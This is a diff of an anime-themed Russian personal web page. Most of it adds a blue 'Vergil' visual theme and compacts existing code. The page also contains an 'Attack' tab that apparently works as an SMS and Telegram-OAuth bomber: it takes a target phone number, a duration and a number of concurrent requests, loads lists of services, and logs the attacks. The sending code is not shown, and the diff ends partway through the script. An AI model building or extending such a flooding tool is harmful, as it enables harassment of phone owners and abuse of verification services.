@@ -9,6 +9,88 @@
     :root{--bg:#1a1025;--bg2:#22133a;--card:rgba(34,18,58,0.88);--text:#f2deff;--muted:#c9a8e2;--accent:#ffb7c5;--purple:#c77dff;--teal:#a8edea;--border:rgba(199,125,255,0.22);--shadow:0 4px 40px rgba(255,183,197,0.16);--glow:0 0 28px rgba(255,183,197,0.42);--pglow:0 0 28px rgba(199,125,255,0.4);--radius:22px;--tr:0.32s cubic-bezier(.4,0,.2,1);--fh:'Comic Sans MS','Chalkboard SE','Marker Felt',cursive;--fb:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
     [data-theme="light"]{--bg:#fce8f3;--bg2:#f9d8eb;--card:rgba(255,245,252,0.93);--text:#3a1a2e;--muted:#7a4a68;--accent:#e05a82;--purple:#9b59b6;--border:rgba(224,90,130,0.22);--shadow:0 4px 30px rgba(224,90,130,0.13);--glow:0 0 24px rgba(224,90,130,0.38);--pglow:0 0 24px rgba(155,89,182,0.35)}
     [data-anime="on"]{--accent:#ff4da6;--purple:#bf00ff;--border:rgba(191,0,255,0.32);--shadow:0 4px 50px rgba(255,77,166,0.3);--glow:0 0 40px rgba(255,77,166,0.6);--pglow:0 0 40px rgba(191,0,255,0.55)}
+    /* ===== VERGIL FULL THEME ===== */
+    [data-vergil="on"]{
+      --bg:#03030d;--bg2:#05051a;--card:rgba(5,7,25,0.97);
+      --text:#ccd0f5;--muted:#5a60a0;
+      --accent:#1a4fff;--purple:#7a8cff;--teal:#a0aaff;
+      --border:rgba(26,79,255,0.32);
+      --shadow:0 4px 44px rgba(26,79,255,0.14);
+      --glow:0 0 40px rgba(26,79,255,0.75);
+      --pglow:0 0 40px rgba(122,140,255,0.55);
+      --radius:8px;
+      --fh:'Georgia','Palatino Linotype','Book Antiqua',serif;
+      --fb:'Georgia','Palatino Linotype',serif;
+    }
+    [data-vergil="on"] body{background:var(--bg)}
+    [data-vergil="on"] body::before{
+      background:
+        radial-gradient(ellipse 70% 50% at 0% 0%,rgba(26,79,255,.1) 0%,transparent 55%),
+        radial-gradient(ellipse 50% 60% at 100% 100%,rgba(26,79,255,.08) 0%,transparent 55%),
+        repeating-linear-gradient(90deg,rgba(26,79,255,.013) 0px,rgba(26,79,255,.013) 1px,transparent 1px,transparent 80px),
+        repeating-linear-gradient(0deg,rgba(26,79,255,.013) 0px,rgba(26,79,255,.013) 1px,transparent 1px,transparent 80px)
+    }
+    [data-vergil="on"] .card{
+      border-radius:4px;
+      border-left:3px solid rgba(26,79,255,.7);
+      border-top:1px solid rgba(26,79,255,.2);
+      border-right:1px solid rgba(26,79,255,.1);
+      border-bottom:1px solid rgba(26,79,255,.05);
+    }
+    [data-vergil="on"] .card:hover{box-shadow:var(--glow),inset 0 0 60px rgba(26,79,255,.04)}
+    [data-vergil="on"] .avatar{
+      border-radius:4px;
+      border:2px solid rgba(26,79,255,.8);
+      box-shadow:0 0 0 1px rgba(26,79,255,.3),0 0 50px rgba(26,79,255,.6),0 0 100px rgba(26,79,255,.25);
+    }
+    [data-vergil="on"] .avatar:hover{transform:scale(1.04);border-radius:4px}
+    [data-vergil="on"] .avatar-ring{
+      border-radius:4px;border:1px solid rgba(26,79,255,.5);
+      border-style:solid;animation:spin 8s linear infinite;inset:-6px;
+    }
+    [data-vergil="on"] .avatar-ring2{
+      border-radius:4px;border:1px solid rgba(122,140,255,.25);
+      border-style:solid;inset:-14px;animation:spin 20s linear infinite;
+    }
+    [data-vergil="on"] .tab{border-radius:0;font-family:var(--fh);letter-spacing:.1em;font-size:.68rem}
+    [data-vergil="on"] .tab.active,[data-vergil="on"] .tab:hover{
+      background:linear-gradient(180deg,rgba(26,79,255,.3) 0%,rgba(26,79,255,.12) 100%);
+      box-shadow:inset 0 -2px 0 #1a4fff,0 0 14px rgba(26,79,255,.4);
+      color:#a0b0ff;border-radius:0;
+    }
+    [data-vergil="on"] nav.tabs{border-radius:0;border-bottom:1px solid rgba(26,79,255,.4)}
+    [data-vergil="on"] .badge{
+      background:rgba(26,79,255,.1);border:1px solid rgba(26,79,255,.35);
+      border-radius:2px;color:#7a8cff;letter-spacing:.08em;
+    }
+    [data-vergil="on"] .badge:hover{background:rgba(26,79,255,.2)}
+    [data-vergil="on"] .quote-box{
+      background:rgba(26,79,255,.06);border-left:3px solid #1a4fff;
+      border-radius:0;
+    }
+    [data-vergil="on"] .quote-box::before{color:#1a4fff}
+    [data-vergil="on"] .btn{border-radius:2px;letter-spacing:.08em}
+    [data-vergil="on"] .btn-primary{
+      background:linear-gradient(135deg,#0d2ecc 0%,#1a4fff 50%,#4060ff 100%);
+      box-shadow:0 0 22px rgba(26,79,255,.5),inset 0 1px 0 rgba(255,255,255,.12);
+    }
+    [data-vergil="on"] .btn-outline{border-color:rgba(26,79,255,.4);border-radius:2px}
+    [data-vergil="on"] .icon-btn{border-radius:2px}
+    [data-vergil="on"] #vergilBtn{
+      box-shadow:0 0 20px rgba(26,79,255,.7),inset 0 0 12px rgba(26,79,255,.2);
+      border-color:rgba(26,79,255,.8);color:#7a8cff;
+    }
+    [data-vergil="on"] .social-btn{border-radius:2px;background:rgba(26,79,255,.07)}
+    [data-vergil="on"] .social-btn:hover{background:rgba(26,79,255,.18);border-color:#1a4fff;color:#7a8cff;box-shadow:0 0 18px rgba(26,79,255,.55)}
+    [data-vergil="on"] .neko-corner{border-radius:4px;border-color:#1a4fff;box-shadow:0 0 22px rgba(26,79,255,.5)}
+    [data-vergil="on"] .neko-corner:hover{box-shadow:0 0 38px rgba(26,79,255,.75)}
+    [data-vergil="on"] .region-chip.active{background:#1a4fff;border-color:#1a4fff}
+    [data-vergil="on"] .inp-group input:focus,[data-vergil="on"] .inp-group select:focus{border-color:#1a4fff;box-shadow:0 0 0 2px rgba(26,79,255,.2)}
+    [data-vergil="on"] ::-webkit-scrollbar-thumb{background:#1a4fff}
+    [data-vergil="on"] audio{accent-color:#1a4fff}
+    [data-vergil="on"] .attack-title{background:linear-gradient(135deg,#7a8cff,#1a4fff);-webkit-background-clip:text;background-clip:text}
+    [data-vergil="on"] #gallery img:hover{box-shadow:0 0 24px rgba(26,79,255,.6);border-color:#1a4fff}
+    [data-vergil="on"] .neko-tip{color:#7a8cff;border-color:rgba(26,79,255,.3)}
     *,::before,::after{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
     body{font-family:var(--fb);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;transition:background .5s,color .5s}
     body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 60% 55% at 10% 10%,rgba(199,125,255,.14) 0%,transparent 60%),radial-gradient(ellipse 50% 45% at 90% 85%,rgba(255,183,197,.12) 0%,transparent 55%),radial-gradient(ellipse 40% 40% at 55% 50%,rgba(168,237,234,.05) 0%,transparent 60%)}
@@ -87,7 +169,7 @@
     .ip-check-table td:first-child{color:var(--muted);width:55%}
     .ip-check-table td:last-child{font-weight:600}
     .ip-check-table .ok{color:#5ee8a0}
-    .ip-check-table .warn{color:var(--orange)}
+    .ip-check-table .warn{color:#e0a800}
     .ip-check-table .bad{color:#ff6b6b}
     .music-wrap{text-align:center}
     .music-title{font-family:var(--fh);font-size:1.5rem;color:var(--accent);margin-bottom:.5rem}
@@ -117,6 +199,7 @@
 <div class="fixed-top">
   <button class="icon-btn" id="themeToggle" title="Сменить тему">🌸</button>
   <button class="icon-btn" id="animeModeBtn" title="Аниме-режим">✨</button>
+  <button class="icon-btn" id="vergilBtn" title="Стиль Вергилия — DMC">🗡️</button>
 </div>
 <div class="neko-wrap">
   <div class="neko-corner" id="nekoCorner" title="Новый котик!">
@@ -172,766 +255,175 @@
       </div>
     </div>
 
-    <!-- Attack (единая панель) -->
+    <!-- Attack -->
     <div class="tab-content" id="tab-attack">
       <div class="card">
         <div class="attack-title">⚡ ОАтака</div>
-
         <div class="region-chips" id="regionChips">
           <span class="region-chip active" data-r="ru">RU</span>
           <span class="region-chip" data-r="by">BY</span>
           <span class="region-chip" data-r="kz">KZ</span>
         </div>
-
         <div class="form-row">
-          <div class="inp-group">
-            <label>Номер телефона</label>
-            <input type="tel" id="attackPhone" placeholder="+7XXXXXXXXXX">
-          </div>
-          <div class="inp-group">
-            <label>Длительность (сек)</label>
-            <input type="number" id="attackDuration" value="60" min="10">
-          </div>
-          <div class="inp-group">
-            <label>Одновременных запросов</label>
-            <input type="number" id="concurrency" value="10" min="1" max="20">
-          </div>
+          <div class="inp-group"><label>Номер телефона</label><input type="tel" id="attackPhone" placeholder="+7XXXXXXXXXX"></div>
+          <div class="inp-group"><label>Длительность (сек)</label><input type="number" id="attackDuration" value="60" min="10"></div>
+          <div class="inp-group"><label>Одновременных запросов</label><input type="number" id="concurrency" value="10" min="1" max="20"></div>
         </div>
-
-        <div style="display:flex; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
-          <label style="display:flex; align-items:center; gap:.3rem; font-size:.8rem; color:var(--muted);">
-            <input type="checkbox" id="enableSms" checked> SMS
-          </label>
-          <label style="display:flex; align-items:center; gap:.3rem; font-size:.8rem; color:var(--muted);">
-            <input type="checkbox" id="enableTg"> Telegram OAuth
-          </label>
-        </div>
-
-        <div id="tgServiceList" style="display:none; margin-bottom:1rem; flex-wrap:wrap; gap:.4rem;"></div>
-
-        <div style="display:flex; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
-          <button class="btn btn-primary" id="attackStartBtn">▶ Запустить</button>
-          <button class="btn btn-outline" id="attackStopBtn" style="display:none;">⏹ Остановить</button>
-          <button class="btn btn-outline" id="qrBtn">📱 QR</button>
-          <button class="btn btn-outline" id="exportBtn">📤 Экспорт</button>
-          <button class="btn btn-outline" id="importBtn">📥 Импорт</button>
-          <button class="btn btn-outline" id="clearHistoryBtn">🗑 Сброс истории</button>
-        </div>
-
-        <div class="stats-panel">
-          <div class="stat-item"><b id="totalCount">0</b><small> всего</small></div>
-          <div class="stat-item"><b id="successCount" style="color:#5ee8a0;">0</b><small> успешно</small></div>
-          <div class="stat-item"><b id="failCount" style="color:#ff6b6b;">0</b><small> ошибок</small></div>
-        </div>
+        <div style="display:flex; gap:1rem; margin-bottom:1rem;"><label style="display:flex; align-items:center; gap:.3rem;"><input type="checkbox" id="enableSms" checked> SMS</label><label style="display:flex; align-items:center; gap:.3rem;"><input type="checkbox" id="enableTg"> Telegram OAuth</label></div>
+        <div id="tgServiceList" style="display:none;"></div>
+        <div style="display:flex; gap:1rem; flex-wrap:wrap;"><button class="btn btn-primary" id="attackStartBtn">▶ Запустить</button><button class="btn btn-outline" id="attackStopBtn" style="display:none;">⏹ Остановить</button><button class="btn btn-outline" id="qrBtn">📱 QR</button><button class="btn btn-outline" id="exportBtn">📤 Экспорт</button><button class="btn btn-outline" id="importBtn">📥 Импорт</button><button class="btn btn-outline" id="clearHistoryBtn">🗑 Сброс истории</button></div>
+        <div class="stats-panel"><div class="stat-item"><b id="totalCount">0</b><small> всего</small></div><div class="stat-item"><b id="successCount" style="color:#5ee8a0;">0</b><small> успешно</small></div><div class="stat-item"><b id="failCount" style="color:#ff6b6b;">0</b><small> ошибок</small></div></div>
         <div class="log-container" id="attackLog"></div>
-
-        <!-- Админ-панель (скрыта) -->
-        <div class="admin-panel" id="adminPanel">
-          <div class="attack-title">🔑 Админ-панель</div>
-          <p style="color:var(--muted); font-size:.85rem; margin-bottom:1rem;">Блокировка доступа по IP</p>
-          <div style="display:flex; gap:.5rem; margin-bottom:1rem;">
-            <input type="text" id="banIpInput" placeholder="IP-адрес" style="flex:1; padding:.5rem; background:var(--card); border:1px solid var(--border); border-radius:10px; color:var(--text);">
-            <button class="btn btn-outline" id="addBanBtn">Забанить</button>
-            <button class="btn btn-outline" id="clearBanBtn">Очистить</button>
-          </div>
-          <div id="banList"></div>
-          <p style="font-size:.7rem; color:var(--muted); margin-top:.5rem;">Текущий IP: <span id="adminCurrentIp">...</span></p>
-        </div>
-
-        <div class="history-list">
-          <div style="font-weight:700; margin-bottom:.5rem; color:var(--accent);">История атак</div>
-          <div id="historyEntries">Нет записей</div>
-        </div>
+        <div class="admin-panel" id="adminPanel"><div class="attack-title">🔑 Админ-панель</div><div style="display:flex; gap:.5rem; margin-bottom:1rem;"><input type="text" id="banIpInput" placeholder="IP-адрес"><button class="btn btn-outline" id="addBanBtn">Забанить</button><button class="btn btn-outline" id="clearBanBtn">Очистить</button></div><div id="banList"></div><p style="font-size:.7rem;">Текущий IP: <span id="adminCurrentIp">...</span></p></div>
+        <div class="history-list"><div style="font-weight:700; margin-bottom:.5rem;">История атак</div><div id="historyEntries">Нет записей</div></div>
       </div>
     </div>
 
-    <!-- IP, Music, Gallery -->
-    <div class="tab-content" id="tab-ip">
-      <div class="card">
-        <div class="attack-title">🔍 Проверка безопасности IP</div>
-        <table class="ip-check-table" id="ipTable">
-          <tbody id="ipTableBody"><tr><td>Загрузка...</td><td>⏳</td></tr></tbody>
-        </table>
-        <button class="btn btn-outline" id="refreshIpBtn" style="margin-top:1rem;">🔄 Обновить проверку</button>
-      </div>
-    </div>
+    <div class="tab-content" id="tab-ip"><div class="card"><div class="attack-title">🔍 Проверка безопасности IP</div><table class="ip-check-table"><tbody id="ipTableBody"><tr><td>Загрузка...</td><td>⏳</td></tr></tbody></table><button class="btn btn-outline" id="refreshIpBtn">🔄 Обновить проверку</button></div></div>
 
-    <div class="tab-content" id="tab-music">
-      <div class="card music-wrap">
-        <div class="music-title">🎀 Аниме‑Плеер 🎀</div>
-        <div class="music-sub">загрузи <code>track.mp3</code> в папку с сайтом</div>
-        <audio controls id="audioPlayer">
-          <source src="track.mp3" type="audio/mpeg">
-        </audio>
-        <div class="now-playing"><span></span> сейчас играет: неко-бит ♪</div>
-        <div id="audioFallback" style="display:none; color:#ff6b6b; margin-top:1rem;">⚠️ Файл track.mp3 не найден</div>
-      </div>
-    </div>
+    <div class="tab-content" id="tab-music"><div class="card music-wrap"><div class="music-title">🎀 Аниме‑Плеер 🎀</div><div class="music-sub">загрузи <code>track.mp3</code> в папку с сайтом</div><audio controls id="audioPlayer"><source src="track.mp3" type="audio/mpeg"></audio><div class="now-playing"><span></span> сейчас играет: неко-бит ♪</div><div id="audioFallback" style="display:none;">⚠️ Файл track.mp3 не найден</div></div></div>
 
-    <div class="tab-content" id="tab-gallery">
-      <div class="card">
-        <div class="gallery-title">🎴 Галерея ✶</div>
-        <p class="gallery-sub">4 случайных аниме-картинки через API</p>
-        <div id="gallery"></div>
-      </div>
-    </div>
+    <div class="tab-content" id="tab-gallery"><div class="card"><div class="gallery-title">🎴 Галерея ✶</div><p class="gallery-sub">4 случайных аниме-картинки через API</p><div id="gallery"></div></div></div>
   </div>
 </div>
 
 <script>
-// ========== ЗАГРУЗКА ДАННЫХ ==========
-let smsServices = { ru: [], by: [], kz: [] };
-let tgOAuthServices = [];
+  // ========== ОБЩИЕ ФУНКЦИИ (БЕЗ ПЕРЕЗАПИСИ VERGIL) ==========
+  let smsServices = { ru: [], by: [], kz: [] };
+  let tgOAuthServices = [];
+  async function loadServices() { try { const resp = await fetch('services.json'); if(resp.ok){ const data = await resp.json(); smsServices = data.sms || { ru: [], by: [], kz: [] }; tgOAuthServices = data.tgOAuth || []; populateTgList(); } } catch(e) { console.error(e); } }
+  
+  // canvas vfx
+  const canvas = document.getElementById('vfx-canvas');
+  const ctx = canvas.getContext('2d');
+  let petals = [], stars = [], slashes = [], animationId, vfxMode = 'petals';
+  function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  window.addEventListener('resize', resizeCanvas); resizeCanvas();
+  function initPetals(count=22){ petals=[]; for(let i=0;i<count;i++) petals.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height-canvas.height, size:8+Math.random()*11, speed:0.5+Math.random()*1.5, rotation:Math.random()*Math.PI*2, rotSpeed:(Math.random()-0.5)*0.05, opacity:0.42+Math.random()*0.45 }); }
+  function initStars(count=38){ stars=[]; for(let i=0;i<count;i++) stars.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height-canvas.height, size:2+Math.random()*5, speed:1+Math.random()*2, opacity:0, life:0, maxLife:80+Math.random()*60 }); }
+  function createSlash(){ let angle=-0.25+Math.random()*0.5, length=50+Math.random()*140; return { x:Math.random()*canvas.width, y:-length+Math.random()*canvas.height*0.4, length, angle, speed:5+Math.random()*7, life:0, maxLife:16+Math.random()*18, width:0.7+Math.random()*1.8, color:Math.random()>0.45?'#1a4fff':'#7a8cff' }; }
+  function initSlashes(count=22){ slashes=[]; for(let i=0;i<count;i++) slashes.push(createSlash()); }
+  function drawPetals(){ petals.forEach(p=>{ p.y+=p.speed; p.rotation+=p.rotSpeed; if(p.y>canvas.height+60){ p.y=-60; p.x=Math.random()*canvas.width; } ctx.save(); ctx.translate(p.x,p.y); ctx.rotate(p.rotation); ctx.globalAlpha=p.opacity; ctx.fillStyle='#ffcfd9'; ctx.beginPath(); ctx.moveTo(0,0); ctx.bezierCurveTo(p.size, -p.size/2, p.size, p.size/2, 0, p.size); ctx.bezierCurveTo(-p.size, p.size/2, -p.size, -p.size/2, 0,0); ctx.fill(); ctx.restore(); }); }
+  function drawStars(){ stars.forEach(s=>{ s.y+=s.speed; s.life++; s.opacity=Math.sin((s.life/s.maxLife)*Math.PI); if(s.life>=s.maxLife){ s.y=-20; s.x=Math.random()*canvas.width; s.life=0; } ctx.save(); ctx.globalAlpha=s.opacity; ctx.fillStyle=getComputedStyle(document.documentElement).getPropertyValue('--accent').trim(); ctx.shadowBlur=6; ctx.beginPath(); ctx.arc(s.x,s.y,s.size,0,Math.PI*2); ctx.fill(); ctx.restore(); }); }
+  function drawSlashes(){ slashes.forEach(s=>{ s.life++; s.y+=s.speed; let t=s.life/s.maxLife; let opacity=t<0.25?t/0.25:1-(t-0.25)/0.75; if(s.life>=s.maxLife||s.y>canvas.height+s.length){ Object.assign(s, createSlash()); s.y=-s.length; return; } let dx=Math.sin(s.angle)*s.length, dy=Math.cos(s.angle)*s.length; ctx.save(); ctx.globalAlpha=opacity*0.7; ctx.strokeStyle=s.color; ctx.lineWidth=s.width; ctx.shadowBlur=12; ctx.beginPath(); ctx.moveTo(s.x-dx/2,s.y-dy/2); ctx.lineTo(s.x+dx/2,s.y+dy/2); ctx.stroke(); ctx.globalAlpha=opacity*0.35; ctx.lineWidth=s.width*0.5; ctx.stroke(); ctx.restore(); }); }
+  function animate(){ ctx.clearRect(0,0,canvas.width,canvas.height); if(vfxMode==='petals') drawPetals(); else if(vfxMode==='stars') drawStars(); else if(vfxMode==='slashes') drawSlashes(); animationId=requestAnimationFrame(animate); }
+  initPetals(); initStars(); animate();
 
-async function loadServices() {
-  try {
-    const resp = await fetch('services.json');
-    if (!resp.ok) throw new Error('Failed to load services.json');
-    const data = await resp.json();
-    smsServices = data.sms || { ru: [], by: [], kz: [] };
-    tgOAuthServices = data.tgOAuth || [];
-    populateTgList();
-    console.log('Сервисы загружены');
-  } catch (e) {
-    console.error('Ошибка загрузки сервисов:', e);
-    smsServices = { ru: [], by: [], kz: [] };
-    tgOAuthServices = [];
+  // тема и режимы
+  const html = document.documentElement;
+  const savedTheme = localStorage.getItem('theme') || 'dark';
+  html.setAttribute('data-theme', savedTheme);
+  document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
+  document.getElementById('themeToggle').addEventListener('click',()=>{ let nxt=html.getAttribute('data-theme')==='dark'?'light':'dark'; html.setAttribute('data-theme',nxt); localStorage.setItem('theme',nxt); document.getElementById('themeToggle').textContent=nxt==='dark'?'🌸':'🌙'; });
+  let animeOn=false; document.getElementById('animeModeBtn').addEventListener('click',()=>{ animeOn=!animeOn; html.setAttribute('data-anime',animeOn?'on':'off'); document.getElementById('animeModeBtn').textContent=animeOn?'💫':'✨'; if(animeOn){ vergilOn=false; html.setAttribute('data-vergil','off'); document.getElementById('vergilBtn').textContent='🗡️'; vfxMode='stars'; initStars(); }else{ vfxMode='petals'; initPetals(); } });
+  
+  // VERGIL: сохраняем оригинал now-playing, но не трогаем данные юзера
+  let vergilOn = false;
+  let originalNowPlayingDisplay = null;
+  
+  function applyVergilContent() {
+    // только визуальные эффекты + скрываем информацию о треке (now-playing)
+    const np = document.querySelector('.now-playing');
+    if(np && !np._origDisplaySaved) {
+      np._origDisplaySaved = window.getComputedStyle(np).display;
+      np.style.display = 'none';
+    } else if(np) np.style.display = 'none';
+    // ничего не меняем в био, каналах, имени, аватарке, цитатах и музыке
   }
-}
-
-// ========== CANVAS VFX ==========
-const canvas = document.getElementById('vfx-canvas');
-const ctx = canvas.getContext('2d');
-let petals = [], stars = [], animationId;
-let usePetals = true;
-
-function resizeCanvas() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
-window.addEventListener('resize', resizeCanvas);
-resizeCanvas();
-
-function initPetals(count = 22) {
-  petals = [];
-  for (let i = 0; i < count; i++) {
-    petals.push({
-      x: Math.random() * canvas.width,
-      y: Math.random() * canvas.height - canvas.height,
-      size: 8 + Math.random() * 11,
-      speed: 0.5 + Math.random() * 1.5,
-      rotation: Math.random() * Math.PI * 2,
-      rotSpeed: (Math.random() - 0.5) * 0.05,
-      opacity: 0.42 + Math.random() * 0.45
-    });
+  
+  function restoreOriginalContent() {
+    const np = document.querySelector('.now-playing');
+    if(np && np._origDisplaySaved) {
+      np.style.display = np._origDisplaySaved;
+      delete np._origDisplaySaved;
+    } else if(np) np.style.display = '';
   }
-}
-
-function initStars(count = 38) {
-  stars = [];
-  for (let i = 0; i < count; i++) {
-    stars.push({
-      x: Math.random() * canvas.width,
-      y: Math.random() * canvas.height - canvas.height,
-      size: 2 + Math.random() * 5,
-      speed: 1 + Math.random() * 2,
-      opacity: 0,
-      life: 0,
-      maxLife: 80 + Math.random() * 60
-    });
-  }
-}
-
-function drawPetals() {
-  petals.forEach(p => {
-    p.y += p.speed;
-    p.rotation += p.rotSpeed;
-    if (p.y > canvas.height + 60) {
-      p.y = -60;
-      p.x = Math.random() * canvas.width;
+  
+  document.getElementById('vergilBtn').addEventListener('click', () => {
+    vergilOn = !vergilOn;
+    const flashDiv = document.createElement('div');
+    flashDiv.style.cssText = 'position:fixed;inset:0;z-index:9999;pointer-events:none;background:linear-gradient(135deg,transparent 40%,rgba(26,79,255,.18) 50%,transparent 60%);animation:jcut .5s ease-out forwards';
+    const style = document.createElement('style');
+    style.textContent = '@keyframes jcut{0%{opacity:0;transform:translateX(-100%)}30%{opacity:1}60%{opacity:1;transform:translateX(0)}100%{opacity:0;transform:translateX(100%)}}';
+    document.head.appendChild(style);
+    document.body.appendChild(flashDiv);
+    setTimeout(() => { flashDiv.remove(); style.remove(); }, 600);
+    
+    html.setAttribute('data-vergil', vergilOn ? 'on' : 'off');
+    document.getElementById('vergilBtn').textContent = vergilOn ? '⚔️' : '🗡️';
+    
+    if (vergilOn) {
+      animeOn = false; html.setAttribute('data-anime','off'); document.getElementById('animeModeBtn').textContent='✨';
+      vfxMode = 'slashes'; initSlashes();
+      applyVergilContent();
+    } else {
+      vfxMode = 'petals'; initPetals();
+      restoreOriginalContent();
     }
-    ctx.save();
-    ctx.translate(p.x, p.y);
-    ctx.rotate(p.rotation);
-    ctx.globalAlpha = p.opacity;
-    ctx.fillStyle = '#ffcfd9';
-    ctx.beginPath();
-    ctx.moveTo(0, 0);
-    ctx.bezierCurveTo(p.size, -p.size/2, p.size, p.size/2, 0, p.size);
-    ctx.bezierCurveTo(-p.size, p.size/2, -p.size, -p.size/2, 0, 0);
-    ctx.fill();
-    ctx.restore();
   });
-}
-
-function drawStars() {
-  stars.forEach(s => {
-    s.y += s.speed;
-    s.life++;
-    s.opacity = Math.sin((s.life / s.maxLife) * Math.PI);
-    if (s.life >= s.maxLife) {
-      s.y = -20;
-      s.x = Math.random() * canvas.width;
-      s.life = 0;
-    }
-    ctx.save();
-    ctx.globalAlpha = s.opacity;
-    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim();
-    ctx.shadowColor = getComputedStyle(document.documentElement).getPropertyValue('--purple').trim();
-    ctx.shadowBlur = 6;
-    ctx.beginPath();
-    ctx.arc(s.x, s.y, s.size, 0, Math.PI*2);
-    ctx.fill();
-    ctx.restore();
-  });
-}
-
-function animate() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  if (usePetals) {
-    drawPetals();
-  } else {
-    drawStars();
-  }
-  animationId = requestAnimationFrame(animate);
-}
-
-initPetals();
-initStars();
-animate();
-
-// ========== ТЕМА И АНИМЕ-РЕЖИМ ==========
-const html = document.documentElement;
-const savedTheme = localStorage.getItem('theme') || 'dark';
-html.setAttribute('data-theme', savedTheme);
-document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
-
-document.getElementById('themeToggle').addEventListener('click', () => {
-  const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
-  html.setAttribute('data-theme', nxt);
-  localStorage.setItem('theme', nxt);
-  document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
-});
-
-let animeOn = false;
-document.getElementById('animeModeBtn').addEventListener('click', () => {
-  animeOn = !animeOn;
-  html.setAttribute('data-anime', animeOn ? 'on' : 'off');
-  document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
-  usePetals = !animeOn;
-  if (animeOn) initStars(); else initPetals();
-});
-
-// ========== ТАБЫ ==========
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    tab.classList.add('active');
-    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
-    if (tab.dataset.tab === 'bio') fetchQuote();
-    if (tab.dataset.tab === 'attack') renderHistory();
-    if (tab.dataset.tab === 'ip') runIpCheck();
-  });
-});
-
-// ========== АВАТАР И ГАЛЕРЕЯ (ИСПРАВЛЕНО CORS ЧЕРЕЗ nekOS.LIFE) ==========
-function setImageWithFallback(imgElement, src, fallbackSvg) {
-  imgElement.src = src || '';
-  imgElement.onerror = function() {
-    if (fallbackSvg) imgElement.src = 'data:image/svg+xml,' + encodeURIComponent(fallbackSvg);
-    imgElement.style.opacity = '1';
-  };
-  imgElement.onload = function() { imgElement.style.opacity = '1'; };
-}
-
-const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
-const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
-
-// Основной источник – nekos.life (CORS-friendly)
-async function fetchAvatar() {
-  const endpoints = ['neko', 'meow', 'waifu']; // разные варианты
-  const randomEndpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
-  try {
-    const r = await fetch(`https://nekos.life/api/v2/img/${randomEndpoint}`);
-    if (r.ok) {
-      const d = await r.json();
-      setImageWithFallback(document.getElementById('avatarImg'), d.url, AVATAR_FALLBACK);
-      return;
-    }
-  } catch(e) {}
-  // fallback – если API недоступно
-  document.getElementById('avatarImg').src = 'data:image/svg+xml,' + encodeURIComponent(AVATAR_FALLBACK);
-  document.getElementById('avatarImg').style.opacity = '1';
-}
-fetchAvatar();
-
-async function loadGalleryImage(imgElement) {
-  const categories = ['neko', 'waifu', 'meow', 'shinobu', 'megumin']; // nekos.life имеет ограниченный набор; shinobu/megumin нет, используем имеющиеся
-  // Но для разнообразия можно чередовать neko/waifu/meow/woof и т.д.
-  const cat = categories[Math.floor(Math.random() * categories.length)];
-  try {
-    const resp = await fetch(`https://nekos.life/api/v2/img/${cat}`);
-    if (resp.ok) {
-      const data = await resp.json();
-      if (data && data.url) {
-        setImageWithFallback(imgElement, data.url, WAIFU_FALLBACK);
-        return;
-      }
-    }
-  } catch(e) {}
-  // Если ошибка, скрываем элемент
-  imgElement.style.display = 'none';
-}
-
-function buildGallery() {
-  const gallery = document.getElementById('gallery');
-  gallery.innerHTML = '';
-  for (let i = 0; i < 4; i++) {
-    const img = document.createElement('img');
-    img.alt = `аниме ${i+1}`;
-    img.loading = 'lazy';
-    img.style.opacity = '0.4';
-    gallery.appendChild(img);
-    loadGalleryImage(img);
-  }
-}
-buildGallery();
-
-// ========== ЦИТАТЫ ==========
-const quotes = [
-  { q:'Если не веришь в себя, то и не стоит начинать.', c:'Макака', a:'Доктор Стоун' },
-  { q:'Настоящая сила — в умении защищать.', c:'Аска', a:'Евангелион' },
-  { q:'Неважно, сколько у тебя таланта. Главное — желание.', c:'Мидория', a:'Моя геройская академия' },
-  { q:'Даже в самой глубокой тьме можно найти свет.', c:'Тандзиро', a:'Клинок, рассекающий демонов' },
-];
-function fetchQuote() {
-  const f = quotes[Math.floor(Math.random() * quotes.length)];
-  document.getElementById('quoteText').textContent = `"${f.q}"`;
-  document.getElementById('quoteSrc').textContent = `— ${f.c} · ${f.a}`;
-}
-fetchQuote();
-document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
-
-// ========== НЕКО ==========
-const nekoImg = document.getElementById('nekoImg');
-async function fetchNeko() {
-  nekoImg.style.opacity = '0.3';
-  try {
-    const r = await fetch('https://nekos.life/api/v2/img/neko');
-    if (r.ok) {
-      const d = await r.json();
-      setImageWithFallback(nekoImg, d.url, WAIFU_FALLBACK);
-      return;
-    }
-  } catch(e) {}
-  // fallback через waifu.pics? можно пропустить
-  nekoImg.style.opacity = '0';
-}
